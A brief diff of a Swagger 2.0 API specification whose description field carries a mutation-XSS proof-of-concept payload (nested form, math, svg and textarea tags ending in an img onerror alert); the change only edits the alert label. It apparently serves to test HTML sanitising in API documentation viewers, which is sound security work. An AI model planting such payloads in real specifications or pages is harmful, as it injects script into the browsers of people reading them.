@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Sample API!
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSSPOC-by-G') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSSPOC') src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
